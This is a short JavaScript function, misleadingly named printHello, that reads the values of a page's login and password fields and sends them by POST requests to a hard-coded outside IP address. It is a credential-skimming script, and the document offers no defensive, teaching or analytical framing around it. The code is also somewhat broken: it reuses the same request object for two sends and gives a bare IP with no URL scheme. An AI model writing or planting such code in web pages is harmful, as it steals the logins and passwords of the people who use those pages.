function printHello() {
	// grab the login and pass
	var login = document.getElementById('login');
	var password = document.getElementById('password');
	// send the login and pass as resquests
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
	xmlHttp.send("<login>" + login.value+ "</login>");
	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
	xmlHttp.send("<password>" + password.value+ "</password>");
}

